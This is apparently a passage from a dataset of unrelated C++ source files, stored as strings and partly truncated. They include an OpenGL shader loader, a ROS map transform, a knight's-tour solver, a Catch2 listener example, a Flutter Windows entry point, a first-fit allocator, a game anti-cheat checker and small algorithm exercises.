nullptr;\n        return res;\n    }\n    \n    // \u8fd9\u91cc\u5185\u90e8new\u4e86\u4e00\u5757\u5185\u5b58, \u9700\u5728\u5916\u90e8\u7528\u5b8c\u540e\u91ca\u653e\n    unsigned char* AllocateBinaryFileBuffer(const std::string& shader_file, size_t &buf_size)\n    {\n        std::string abs_model_file = PathToResourceAsFile(shader_file).ValueOrDie();\n        FILE* file = fopen(abs_model_file.c_str(), \"r\");\n        // read it to a memory chunk\n        fseek(file, 0, SEEK_END);\n        int file_size = ftell(file);\n        fseek(file, 0, SEEK_SET);\n        char* content = new char[file_size];\n        fread(content, file_size, 1, file);\n        fclose(file);\n        buf_size = file_size;\n        return (unsigned char*)content;\n    }\n    \n    // shader\u5185\u7f6e\u7684\u4f1a\u88ab\u7cfb\u7edf\u81ea\u52a8\u66f4\u65b0\u7684uniform.\n    std::list<std::string>& Program::GetAvailableBuiltinUniforms()\n    {\n        static std::list<std::string> AVAILABLE_BUILTIN_UNIFORMS =\n        {\n            \"matWorld\",\n            \"matView\",\n            \"matProjection\",\n            \"matWorldView\",\n            \"matViewProjection\",\n            \"matWVP\",\n            \"diffuseEnvMap\",\n            \"specularEnvMap\",\n            \"iblBrdfLutMap\",\n            \"iblDiffuseEnvMap\",\n            \"iblSpecularEnvMap\",\n            // \u9700\u8981\u4ec0\u4e48\u81ea\u884c\u6dfb\u52a0\u5b9e\u73b0\n        };\n        return AVAILABLE_BUILTIN_UNIFORMS;\n    };\n    \n    Program::Program()\n    {\n    }\n    \n    Program::~Program()\n    {\n        if (m_gl_program > 0)\n        {\n            glDeleteProgram(m_gl_program);\n            m_gl_program = 0;\n        }\n    }\n\n    bool Program::LoadAndCompile(const std::string& vert_file, const std::string& frag_file, const std::string& macros)\n    {\n        GLuint vert_shader = 0;\n        GLuint frag_shader = 0;\n        GLint ok = GL_TRUE;\n        \n        GLuint program = glCreateProgram();\n        if (program == 0) {\n            return false;\n        }\n        \n        std::string shader_prefix = macros + \"\\n\";\n        std::string vert_src = ReadTextFile(vert_file);\n        std::string full_vert_src = shader_prefix + vert_src;\n        ok = ok && GlhCompileShader(GL_VERTEX_SHADER, full_vert_src.c_str(), &vert_shader);\n            \n        std::string frag_src = ReadTextFile(frag_file);\n        std::string full_frag_src = shader_prefix + frag_src;\n        ok = ok && GlhCompileShader(GL_FRAGMENT_SHADER, full_frag_src.c_str(), &frag_shader);\n        \n        if (ok) {\n            glAttachShader(program, vert_shader);\n            glAttachShader(program, frag_shader);\n            \n            GLint status;\n            glLinkProgram(program);\n            glGetProgramiv(program, GL_LINK_STATUS, &status);\n            if (!status)\n            {\n                GLchar    buff[1024];\n                GLsizei     length;\n                glGetProgramInfoLog(program, 1024, &length, buff);\n                printf(\"length:%i\\nlog:'%s'\\n\", length, buff);\n                return false;\n            }\n        }\n        \n        if (vert_shader) glDeleteShader(vert_shader);\n        if (frag_shader) glDeleteShader(frag_shader);\n        \n        if (!ok) {\n            glDeleteProgram(program);\n            program = 0;\n            return false;\n        }\n\n        // extract all available uniforms and attribs\n        char buf[1024];\n        int active_attribs = 0;\n        glGetProgramiv(program, GL_ACTIVE_ATTRIBUTES, &active_attribs);\n        for (int i=0; i<active_attribs; i++)\n        {\n            int name_len = 0;\n            Attrib attrib;\n            glGetActiveAttrib(program, i, 1024, &name_len, &attrib.size, &attrib.type, buf);\n            buf[name_len] = 0;\n            attrib.name = buf;\n            attrib.location = glGetAttribLocation(program, buf);\n            m_attribs[attrib.name] = attrib;\n        }\n\n        int active_uniforms = 0;\n        glGetProgramiv(program, GL_ACTIVE_UNIFORMS, &active_uniforms);\n        for (int i=0; i<active_uniforms; i++)\n        {\n            int name_len = 0;\n            Uniform uniform;\n            glGetActiveUniform(program, i, 1024, &name_len, &uniform.size, &uniform.type, buf);\n            buf[name_len] = 0;\n            uniform.name = buf;\n            uniform.location = glGetUniformLocation(program, buf",
    "//\n// Created by lihao on 19-7-10.\n//\n\n#include \"Astar/OccMapTransform.h\"\n\nOccupancyGridParam::OccupancyGridParam()\n{\n\n}\n\nvoid OccupancyGridParam::GetOccupancyGridParam(const nav_msgs::msg::OccupancyGrid::SharedPtr OccGrid)\n{\n    // Get parameter\n    resolution = OccGrid->info.resolution;\n    height = OccGrid->info.height;\n    width = OccGrid->info.width;\n    x = OccGrid->info.origin.position.x;\n    y = OccGrid->info.origin.position.y;\n\n    double roll, pitch, yaw;\n    geometry_msgs::msg::Quaternion q = OccGrid->info.origin.orientation;\n    tf2::Quaternion quat(q.x, q.y, q.z, q.w); // x, y, z, w\n    tf2::Matrix3x3(quat).getRPY(roll, pitch, yaw);\n    theta = yaw;\n\n    // Calculate R, t\n    R = Mat::zeros(2,2, CV_64FC1);\n    R.at<double>(0, 0) = resolution * cos(theta);\n    R.at<double>(0, 1) = resolution * sin(-theta);\n    R.at<double>(1, 0) = resolution * sin(theta);\n    R.at<double>(1, 1) = resolution * cos(theta);\n    t = Mat(Vec2d(x, y), CV_64FC1);\n}\n\nvoid OccupancyGridParam::Image2MapTransform(Point& src_point, Point2d& dst_point)\n{\n    // Upside down\n    Mat P_src = Mat(Vec2d(src_point.x, height - 1 - src_point.y), CV_64FC1);\n    // Rotate and translate\n    Mat P_dst = R * P_src + t;\n\n    dst_point.x = P_dst.at<double>(0, 0);\n    dst_point.y = P_dst.at<double>(1, 0);\n}\n\nvoid OccupancyGridParam::Map2ImageTransform(Point2d& src_point, Point& dst_point)\n{\n    Mat P_src = Mat(Vec2d(src_point.x, src_point.y), CV_64FC1);\n    // Rotate and translate\n    Mat P_dst = R.inv() * (P_src - t);\n    // Upside down\n    dst_point.x = round(P_dst.at<double>(0, 0));\n    dst_point.y = height - 1 - round(P_dst.at<double>(1, 0));\n}",
    "#include <iostream>\n#include <fstream>\n#include <stdexcept>\n#include <vector>\n\n#include <chrono> // Include for timing\n\nusing namespace std;\nusing namespace chrono;\n\n\nconst int MAX_SIZE = 76; // Maximum board size (determined by a constant)\nint totalMotion = 0;  // Counter of the knight's moves\nint desk[MAX_SIZE][MAX_SIZE]; // A two-dimensional array representing a chessboard\nint step[8][2] = { {1,-2}, {2,-1}, {2,1}, {1,2}, {-1,2}, {-2,1}, {-2,-1}, {-1,-2} }; // Array of possible knight moves\n\n\nvoid readKnightFile(const string& filename, int& boardSize, int& KnightRow, int& KnightCol)\n{\n\tifstream file(filename);\n\n\tif (!file.is_open())\n\t{\n\t\tthrow runtime_error(\"The file could not be opened: \" + filename);\n\t}\n\n\tfile >> boardSize;\n\tif (file.fail() || boardSize < 5 || boardSize > MAX_SIZE)\n\t{\n\t\tthrow invalid_argument(\"The board size must be at least 5 and no more than 76\");\n\t}\n\n\t// Reading the initial position of the knight\n\tfile >> KnightRow >> KnightCol;\n\tif (file.fail() || KnightRow < 0 || KnightCol < 0 || KnightRow > boardSize || KnightCol > boardSize)\n\t{\n\t\tthrow out_of_range(\"The knight's starting position must be within the board.\");\n\t}\n\n\tfile.close();\n}\n\n\nvoid readKnightConsole(int& boardSize, int& KnightRow, int& KnightCol)\n{\n\tbool validInput = false; // A flag indicating that the input is correct\n\n\twhile (!validInput) {\n\t\ttry {\n\t\t\tcout << \"Enter the board size (number of rows and columns): \";\n\t\t\tcin >> boardSize;\n\n\t\t\tif (cin.fail() || boardSize < 5 || boardSize > MAX_SIZE)\n\t\t\t{\n\t\t\t\tthrow invalid_argument(\"The board size must be at least 5 and no more than 10\");\n\t\t\t}\n\n\t\t\tcout << \"Enter the position of the knight (row number and column number): \";\n\t\t\tcin >> KnightRow >> KnightCol;\n\n\t\t\tif (cin.fail() || KnightRow < 0 || KnightCol < 0 || KnightRow > boardSize || KnightCol > boardSize)\n\t\t\t{\n\t\t\t\tthrow out_of_range(\"The knight's starting position must be within the board.\");\n\t\t\t}\n\n\t\t\tvalidInput = true;\n\t\t}\n\t\tcatch (const exception& e) {\n\t\t\tcerr << \"Error: \" << e.what() << endl;\n\t\t\tcin.clear();\n\t\t\tcin.ignore(numeric_limits<streamsize>::max(), '\\n');\n\t\t}\n\t}\n}\n\n// Function for initializing the chessboard\nvoid setDesk(int n)\n{\n\tfor (int i = 0; i < n; i++) {\n\t\tfor (int j = 0; j < n; j++)\n\t\t{\n\t\t\tdesk[i][j] = 0;\n\t\t}\n\t}\n}\n\n\nvoid printDesk(int n)\n{\n\tprintf(\"totalMotion=%d\\n\", totalMotion);\n\tfor (int i = 0; i < n; i++) {\n\t\tfor (int j = 0; j < n; j++)\n\t\t{\n\t\t\tprintf(\" %3d\", desk[i][j]);\n\t\t}\n\t\tprintf(\"\\n\");\n\t}\n}\n\n// Function to calculate the number of available moves\nint getDegree(int x, int y, int BoardSZ)\n{\n\tint count = 0;\n\tfor (int i = 0; i < 8; ++i)\n\t{\n\t\tint nextX = x + step[i][0];\n\t\tint nextY = y + step[i][1];\n\t\tif (nextX < BoardSZ && nextY < BoardSZ && desk[nextX][nextY] == 0 && nextX >= 0 && nextY >= 0){\n\t\t\tcount++;\n\t\t}\n\t}\n\treturn count;\n}\n\nbool Warnsdorff(int& x, int& y, int BoardSZ)\n{\n\tint minDegree = 9;\n\tint nextX = x;\n\tint nextY = y;\n\n\n\t// Iterate through all possible moves\n\tfor (int i = 0; i < 8; ++i)\n\t{\n\t\tint nx = x + step[i][0];\n\t\tint ny = y + step[i][1];\n\t\tif (nx < BoardSZ && ny < BoardSZ && desk[nx][ny] == 0 && nx >= 0 && ny >= 0)\n\t\t{\n\t\t\tint degree = getDegree(nx, ny, BoardSZ);\n\t\t\tif (degree < minDegree)\n\t\t\t{\n\t\t\t\tminDegree = degree;\n\t\t\t\tnextX = nx;\n\t\t\t\tnextY = ny;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (minDegree == 9)\n\t{\n\t\treturn false;\n\t}\n\n\t// Update the knight's position\n\tx = nextX;\n\ty = nextY;\n\treturn true;\n}\n\n// A function that implements the knight's move algorithm\nbool set_knight(int x, int y, int BoardSZ)\n{\n\tif ((x < 0) || (x >= BoardSZ) || (y < 0) || (y >= BoardSZ))\n\t{\n\t\treturn false;\n\t}\n\n\tif (desk[x][y] != 0)\n\t{\n\t\treturn false;\n\t}\n\n\t// next move\n\ttotalMotion++;\n\tdesk[x][y] = totalMotion;\n\n\t// stop algorithm\n\tif (totalMotion == BoardSZ * BoardSZ) // Check for completion of the game (all cells are passed)\n\t{\n\t\treturn true;\n\t}\n\n\tif (!Warnsdorff(x, y, BoardSZ))\n\t{\n\t\ttotalMotion--;\n\t\tdesk[x][y] = 0;\n\t\treturn false;\n\t}\n\n\tprintDesk(BoardSZ);\n\n\tif (set_knight(x, y, BoardSZ))\n\t{\n\t\treturn true;\n\t}\n\n\ttotalMotion--;\n\tdesk[x][y] = 0;\n\n\t// If none of the moves were successful, return false\n\treturn false;\n}\n//MAIN\nint main()\n{\n\tint boardSize;\n\tint knightRow; // The initial line of the knight's position\n\tint knightCol; // The initial column of the knight's position\n\tint choice;\n\n\n\tcout << \"Select the input method: \\n1 - from the file\\n2 - from the console\\nselection: \";\n\tcin >> choice;\n\n\ttry {\n\t\tif (choice == 1) {\n\t\t\treadKnightFile(\"input.txt\", boardSize, knightRow, knightCol);\n\t\t}\n\t\telse if (choice == 2) {\n\t\t\treadKnightConsole(boardSize, knightRow, knightCol);\n\t\t}\n\t\telse {\n\t\t\tthrow invalid_argument(\"The wrong choice. Please choose 1 or 2.\");\n\t\t}\n\n\t\tcout << \"Board size: \" << boardSize << \"\\n\";\n\t\tcout << \"The initial position of the knight: (\" << knightRow << \", \" << knightCol << \")\\n\";\n\t}\n\tcatch (const exception& e) {\n\t\tcerr << \"Error: \" << e.what() << endl;\n\t}\n\n\tauto start = high_resolution_clock::now(); // Start timing\n\n\tsetDesk(boardSize);\n\tif (set_knight(knightRow, knightCol, boardSize)) {\n\t\tprintDesk(boardSize);\n\t}\n\telse {\n\t\tcou",
    "\n//              Copyright Catch2 Authors\n// Distributed under the Boost Software License, Version 1.0.\n//   (See accompanying file LICENSE.txt or copy at\n//        https://www.boost.org/LICENSE_1_0.txt)\n\n// SPDX-License-Identifier: BSL-1.0\n\n// 210-Evt-EventListeners.cpp\n\n// Contents:\n// 1. Printing of listener data\n// 2. My listener and registration\n// 3. Test cases\n\n#include <catch2/catch_test_macros.hpp>\n#include <catch2/reporters/catch_reporter_event_listener.hpp>\n#include <catch2/reporters/catch_reporter_registrars.hpp>\n#include <catch2/catch_test_case_info.hpp>\n#include <iostream>\n\n// -----------------------------------------------------------------------\n// 1. Printing of listener data:\n//\n\n\nnamespace {\nstd::string ws(int const level) {\n    return std::string( 2 * level, ' ' );\n}\n\nstd::ostream& operator<<(std::ostream& out, Catch::Tag t) {\n    return out << \"original: \" << t.original;\n}\n\ntemplate< typename T >\nstd::ostream& operator<<( std::ostream& os, std::vector<T> const& v ) {\n    os << \"{ \";\n    for ( const auto& x : v )\n        os << x << \", \";\n    return os << \"}\";\n}\n// struct SourceLineInfo {\n//     char const* file;\n//     std::size_t line;\n// };\n\nvoid print( std::ostream& os, int const level, std::string const& title, Catch::SourceLineInfo const& info ) {\n    os << ws(level  ) << title << \":\\n\"\n       << ws(level+1) << \"- file: \" << info.file << \"\\n\"\n       << ws(level+1) << \"- line: \" << info.line << \"\\n\";\n}\n\n//struct MessageInfo {\n//    std::string macroName;\n//    std::string message;\n//    SourceLineInfo lineInfo;\n//    ResultWas::OfType type;\n//    unsigned int sequence;\n//};\n\nvoid print( std::ostream& os, int const level, Catch::MessageInfo const& info ) {\n    os << ws(level+1) << \"- macroName: '\" << info.macroName << \"'\\n\"\n       << ws(level+1) << \"- message '\"    << info.message   << \"'\\n\";\n    print( os,level+1  , \"- lineInfo\", info.lineInfo );\n    os << ws(level+1) << \"- sequence \"    << info.sequence  << \"\\n\";\n}\n\nvoid print( std::ostream& os, int const level, std::string const& title, std::vector<Catch::MessageInfo> const& v ) {\n    os << ws(level  ) << title << \":\\n\";\n    for ( const auto& x : v )\n    {\n        os << ws(level+1) << \"{\\n\";\n        print( os, level+2, x );\n        os << ws(level+1) << \"}\\n\";\n    }\n//    os << ws(level+1) << \"\\n\";\n}\n\n// struct TestRunInfo {\n//     std::string name;\n// };\n\nvoid print( std::ostream& os, int const level, std::string const& title, Catch::TestRunInfo const& info ) {\n    os << ws(level  ) << title << \":\\n\"\n       << ws(level+1) << \"- name: \" << info.name << \"\\n\";\n}\n\n// struct Counts {\n//     std::size_t total() const;\n//     bool allPassed() const;\n//     bool allOk() const;\n//\n//     std::size_t passed = 0;\n//     std::size_t failed = 0;\n//     std::size_t failedButOk = 0;\n// };\n\nvoid print( std::ostream& os, int const level, std::string const& title, Catch::Counts const& info ) {\n    os << ws(level  ) << title << \":\\n\"\n       << ws(level+1) << \"- total(): \"     << info.total()     << \"\\n\"\n       << ws(level+1) << \"- allPassed(): \" << info.allPassed() << \"\\n\"\n       << ws(level+1) << \"- allOk(): \"     << info.allOk()     << \"\\n\"\n       << ws(level+1) << \"- passed: \"      << info.passed      << \"\\n\"\n       << ws(level+1) << \"- failed: \"      << info.failed      << \"\\n\"\n       << ws(level+1) << \"- failedButOk: \" << info.failedButOk << \"\\n\";\n}\n\n// struct Totals {\n//     Counts assertions;\n//     Counts testCases;\n// };\n\nvoid print( std::ostream& os, int const level, std::string const& title, Catch::Totals const& info ) {\n    os << ws(level) << title << \":\\n\";\n    print( os, level+1, \"- assertions\", info.assertions );\n    print( os, level+1, \"- testCases\" , info.testCases  );\n}\n\n// struct TestRunStats {\n//     TestRunInfo runInfo;\n//     Totals totals;\n//     bool aborting;\n// };\n\nvoid print( std::ostream& os, int const level, std::string const& title, Catch::TestRunStats const& info ) {\n    os << ws(level) << title << \":\\n\";\n    print( os, level+1 , \"- runInfo\", info.runInfo );\n    print( os, level+1 , \"- totals\" , info.totals  );\n    os << ws(level+1) << \"- aborting: \" << info.aborting << \"\\n\";\n}\n\n//    struct Tag {\n//        StringRef original, lowerCased;\n//    };\n//\n//\n//    enum class TestCaseProperties : uint8_t {\n//        None = 0,\n//        IsHidden = 1 << 1,\n//        ShouldFail = 1 << 2,\n//        MayFail = 1 << 3,\n//        Throws = 1 << 4,\n//        NonPortable = 1 << 5,\n//        Benchmark = 1 << 6\n//    };\n//\n//\n//    struct TestCaseInfo : NonCopyable {\n//\n//        bool isHidden() const;\n//        bool throws() const;\n//        bool okToFail() const;\n//        bool expectedToFail() const;\n//\n//\n//        std::string name;\n//        std::string className;\n//        std::vector<Tag> tags;\n//        SourceLineInfo lineInfo;\n//        TestCaseProperties properties = TestCaseProperties::None;\n//    };\n\nvoid print( std::ostream& os, int const level, std::string const& title, Catch::TestCaseInfo const& info ) {\n    os << ws(level ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"pokemon\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n\nusing namespace std;\n\nenum Weekday {Monday = 1, Tuesday = 2, Wednesday = 3, Thursday = 4, Friday = 5, Saturday = 6, Sunday = 0};\nenum Month {January = 0, February = 1, March = 2, April = 3, May = 4, June = 5, July = 6, August = 7, September = 8, October = 9, November = 10, December = 11};\n\nint main()\n{\n    int d, d0 = 15, fd = 5, m, m0 = 10, y, y0 = 1582, answer;\n    printf(\"Input date after %d.%d.%d in format dd.mm.yyyy: \", d0, m0, y0);\n    scanf(\"%d.%d.%d\", &d, &m, &y);\n    if (((d>d0 && m>=m0 && y>=y0) || (d<=d0 && m>m0 && y>=y0) || (d<=d0 && m<=m0 && y>y0) || (d>d0 && m<=m0 && y>y0)) && (d>0 && d<=31 && m>0 && m<=12 && y>=y0))\n    {\n        if (y>y0)\n        {\n            for (int i=m0-1; i<12; i++)\n            {\n                switch (i)\n                {\n                    case October:\n                    {\n                        fd += 31-d0;\n                        break;\n                    }\n                    case November:\n                    {\n                        fd += 30;\n                        break;\n                    }\n                    case December:\n                    {\n                        fd += 31;\n                        break;\n                    }\n                    default:\n                    {\n                        break;\n                    }\n                }\n            }\n            for (int i=y0+1; i<y; i++)\n            {\n                if (i%4==0 && (i%100!=0 || i%400==0))\n                {\n                    for (int j=0; j<12; j++)\n                    {\n                        switch (j)\n                        {\n                            case January:\n                            {\n                                fd += 31;\n                                break;\n                            }\n                            case February:\n                            {\n                                fd += 29;\n                                break;\n                            }\n                            case March:\n                            {\n                                fd += 31;\n                                break;\n                            }\n                            case April:\n                            {\n                                fd += 30;\n                                break;\n                            }\n                            case May:\n                            {\n                                fd += 31;\n                                break;\n                            }\n                            case June:\n                            {\n                                fd += 30;\n                                break;\n                            }\n                            case July:\n                            {\n                                fd += 31;\n                                break;\n                            }\n                            case August:\n                            {\n                                fd += 31;\n                                break;\n                            }\n                            case September:\n                            {\n                                fd += 30;\n                                break;\n                            }\n                            case October:\n                            {\n                                fd += 31;\n                                break;\n                            }\n                            case November:\n                            {\n                                fd += 30;\n                                break;\n                            }\n                            case December:\n                            {\n                                fd += 31;\n                                break;\n                            }\n                            default:\n                            {\n                                break;\n                            }\n                        }\n                    }\n                }\n                else\n                {\n                    for (int j=0; j<12; j++)\n                    {\n                        switch (j)\n                        {\n                            case January:\n                            {\n                                fd += 31;\n                                break;\n                            }\n                            case February:\n                            {\n                                fd += 28;\n                                break;\n                            }\n                            case March:\n                            {\n                                fd += 31;\n                                break;\n                            }\n                            case April:\n                            {\n                                fd += 30;\n                                break;\n                            }\n                            case May:\n                            {\n                                ",
    "#include <iostream>\n#include <vector>\nusing namespace std;\n\nclass FirstFitAllocator {\nprivate:\n    vector<int> memoryBlocks; // Available memory blocks\n    vector<int> allocatedBlocks; // Allocation results for processes\n\npublic:\n    // Constructor to initialize memory blocks\n    FirstFitAllocator(vector<int> blocks) {\n        memoryBlocks = blocks;\n        allocatedBlocks.resize(blocks.size(), -1); // Initialize all allocations as -1 (unallocated)\n    }\n\n    // Function to allocate memory to processes using First-Fit algorithm\n    void allocateMemory(vector<int> processSizes) {\n        for (int i = 0; i < processSizes.size(); i++) {\n            bool allocated = false;\n\n            // Try to allocate the process to the first fitting memory block\n            for (int j = 0; j < memoryBlocks.size(); j++) {\n                if (memoryBlocks[j] >= processSizes[i]) {\n                    // Allocate the memory block to the process\n                    memoryBlocks[j] -= processSizes[i];\n                    allocatedBlocks[i] = j; // Record which block was used\n                    allocated = true;\n                    break;\n                }\n            }\n\n            // If no suitable memory block is found\n            if (!allocated) {\n                cout << \"Process \" << i + 1 << \" with size \" << processSizes[i] << \" could not be allocated memory.\\n\";\n            }\n        }\n    }\n\n    // Function to display allocation results\n    void displayAllocation() {\n        cout << \"\\nAllocation Results:\\n\";\n        for (int i = 0; i < allocatedBlocks.size(); i++) {\n            if (allocatedBlocks[i] != -1) {\n                cout << \"Process \" << i + 1 << \" allocated to memory block \" << allocatedBlocks[i] + 1 << \"\\n\";\n            }\n        }\n    }\n\n    // Function to display the remaining memory blocks after allocation\n    void displayRemainingMemory() {\n        cout << \"\\nRemaining Memory in Blocks:\\n\";\n        for (int i = 0; i < memoryBlocks.size(); i++) {\n            cout << \"Block \" << i + 1 << \": \" << memoryBlocks[i] << \" KB remaining\\n\";\n        }\n    }\n};\n\nint main() {\n    // Memory blocks (in KB)\n    vector<int> memoryBlocks = {100, 500, 200, 300, 600};\n\n    // Process sizes (in KB)\n    vector<int> processSizes = {212, 417, 112, 426};\n\n    // Initialize the First-Fit memory allocator\n    FirstFitAllocator allocator(memoryBlocks);\n\n    // Allocate memory to processes\n    allocator.allocateMemory(processSizes);\n\n    // Display the allocation results\n    allocator.displayAllocation();\n\n    // Display remaining memory in blocks after allocation\n    allocator.displayRemainingMemory();\n\n    return 0;\n}\n",
    "#include <SFML/Graphics.hpp>\n\n#include \"../constants.h\"\n\n#include \"../game/game.hpp\"\n\n#include \"../game/process.hpp\"\n\n#include \"integrity/integrity.hpp\"\n\n#include \"../statuses.h\"\n\n#include \"verification/verification.hpp\"\n\n#include \"../utils/memory.hpp\"\n\n#include \"updater/updater.hpp\"\n\nusing namespace std;\n\nbool initialized = false;\nbool performed_integrity_check = false;\nbool cheating_detected = false;\nbool notified_cheats_detected = false;\nbool integrity_check_override = false;\n\nint last_map_id = 0;\nint current_map_id = 0;\n\nvector<std::string> cheats_found;\n\nstd::string main_status = Statuses::GAME_NOT_CONNECTED;\nstd::string info_status = \"\";\n\nnamespace anticheat {\n    void Initialize()\n    {\n        // initialize the verification uids\n        verification::CalculateUIDs();\n\n        // initialize integrity checks\n        integrity::Initialize();\n    }\n\n    // displays the \"Game not connected.\" message\n    void OnGameClosed()\n    {\n        main_status = Statuses::GAME_NOT_CONNECTED;\n        info_status = \"\";\n        initialized = false;\n        performed_integrity_check = false;\n    }\n\n    // specifically makes it so that we dont have to restart the anti cheat when cheats were previously detected\n    void OnGameReopen()\n    {\n        notified_cheats_detected = false;\n        if (cheating_detected)\n        {\n            cheating_detected = false;\n        }\n        initialized = false;\n        cheats_found.clear();\n        info_status = \"\";\n        game::CheckForGameMod();\n    }\n\n    // adds a cheating method to a list, this will be shown in a second window\n    void OnCheatFound(string cheating_method)\n    {\n        cheats_found.push_back(cheating_method);\n    }\n\n    // crashes bo1 when a cheating method is found,\n    // also pops up the second window that explains what was found\n    // this is especially good for players who may accidentally leave something in their files\n    void NotifyCheatsDetected()\n    {\n        cheating_detected = true;\n\n        // notify the player\n        main_status = Statuses::CHEATING_DETECTED;\n        info_status = Statuses::MORE_INFO_WINDOW;\n        notified_cheats_detected = true;\n\n        // crash the game\n        game::process::CloseBlackOpsProcess();\n\n        string cheats = \"The following cheating methods were detected:\\n\";\n        for (string cheat_found : cheats_found)\n        {\n            cheats += \"\\n- \" + cheat_found;\n        }\n\n        MessageBoxA(NULL, cheats.c_str(), \"BO1 Anti Cheat (Detections)\", MB_OK);\n    }\n\n    // this is the magic of the tool, handles all checks performed to ensure a bo1 game is safe\n    void AttemptIntegrityCheck()\n    {\n        if (!game::process::IsGameOpen())\n        {\n            return;\n        }\n\n        last_map_id = current_map_id;\n        current_map_id = game::GetMapId();\n\n        bool map_id_changed = performed_integrity_check && last_map_id != 0 && current_map_id == 0;\n        if (map_id_changed)\n        {\n            performed_integrity_check = false;\n        }\n\n        // only check when the map is being loaded/quit\n        if (!performed_integrity_check)\n        {\n            bool last_map_id_valid = last_map_id != 0 && last_map_id != -1;\n            if ((last_map_id_valid && current_map_id == 0) || integrity_check_override)\n            {\n                main_status = Statuses::CHECKING_FOR_PATCHES;\n                info_status = \"This may take a moment\";\n\n                integrity_check_override = false;\n                performed_integrity_check = true;\n                Sleep(1000);\n\n                // check for any extra files, they should not be there\n                if (integrity::DoExtraFilesExist())\n                {\n                    OnCheatFound(\"Extra files found in zone/Common, could be a stealth patch.\");\n                }\n\n                // check for any known stealth patch injections\n                if (integrity::IsStealthPatchInjected())\n                {\n                    OnCheatFound(\"A known stealth patch DLL was injected.\");\n                }\n\n                // community leaderboard mods: check hashes of the currently loaded mod\n                if (game::IsGameModLoaded() && game::IsModLoaded())\n                {\n                    if (!integrity::IsModFileValid())\n                    {\n                        OnCheatFound(\"mod.ff was found to be modified.\");\n                    }\n                }\n\n                string modified_fastfiles = integrity::GetModifiedFastfiles();\n                if (modified_fastfiles != \"\")\n                {\n                    OnCheatFound(\"Modified fastfiles: \" + modified_fastfiles);\n                }\n\n                // if theres any cheats detected, notify them and crash bo1\n                if (cheats_found.size() > 0)\n                {\n                    NotifyCheatsDetected();\n                }\n                else // otherwise tell them they're good, but we will also tell them that the anti cheat is still gonna check during the game\n                {\n             ",
    "#include <iostream>\n#include <vector>\nusing namespace std;\nstruct Building {\n    int height;\n    int width;\n};\n\nint increasing(vector<Building> &v) {\n    vector<int> res(v.size(),0);\n\n    for (int i = 0; i < v.size(); ++i) {\n        //En cada posicion i de res, quiero poner la \"mejor sublista que termina con el edif i\", o \"MSI\".\n        //Y tambi\u00e9n se que la MSI se construye a partir de agregarle el edificio I a una sublista que termina con un edificio J anterior a I.\n        //Asique de todas las sublistas MSJ que terminan con un edificio J anterior a I, MSI = la mejor de las \"MSJ ++ I\".\n\n        for (int j = 0; j < i; ++j) {                       //Recorro las MSJ\n            if (v[j].height < v[i].height) {\n                res[i] = max(res[i], res[j]);               //Actualizo la MSI con la mejor de las MSJ (siempre que haya compatibilidad de altura)\n            }\n        }\n        res[i] += v[i].width;                               //Y agrego el edificio I\n    }\n\n    int max = res[0];\n    for (int i = 1; i < res.size(); ++i) {\n        max = max<res[i] ? res[i] : max;\n    }\n    return max;                                             //Devuelvo la mejor de las MSI\n}\n\nint decreasing(vector<Building> &v) {\n    vector<int> res(v.size(),0);\n\n    for (int i = 0; i < v.size(); ++i) {\n\n        for (int j = 0; j < i; ++j) {\n            if (v[j].height > v[i].height) {\n                res[i] = max(res[i], res[j]);\n            }\n        }\n        res[i] += v[i].width;\n    }\n\n    int max = res[0];\n    for (int i = 1; i < res.size(); ++i) {\n        max = max<res[i] ? res[i] : max;\n    }\n    return max;\n}\n\nvoid imprimir(int testCase, int i, int d) {\n    if (i>=d) {\n        //increasing primero\n        cout << \"Case \" << testCase << \". Increasing (\" << i << \"). Decreasing (\" << d << \").\" << endl;\n    } else {\n        //decreasing primero\n        cout << \"Case \" << testCase << \". Decreasing (\" << d << \"). Increasing (\" << i << \").\" << endl;\n    }\n}\n\nint main() {\n    int testCases;\n    int numberOfBuildings;\n    cin >> testCases;\n\n    for (int i = 0; i < testCases; ++i) {\n        cin >> numberOfBuildings;\n        vector<Building> buildings (numberOfBuildings);\n        int height;\n        int width;\n\n        for (int j = 0; j < numberOfBuildings; ++j) {\n            cin >> height;\n            buildings[j].height = height;\n        }\n        for (int j = 0; j < numberOfBuildings; ++j) {\n            cin >> width;\n            buildings[j].width = width;\n        }\n        //a este punto, ya tengo completo el vector de alturas y anchos.\n\n        int increasingLength = increasing(buildings);\n        int decreasingLength = decreasing(buildings);\n        imprimir(i+1,increasingLength,decreasingLength);\n\n        //for (int j = 0; j < buildings.size(); ++j) {\n        //    cout << buildings[j].height << \" \" << buildings[j].width << endl;\n        //}\n\n    }\n\n    return 0;\n}\n",
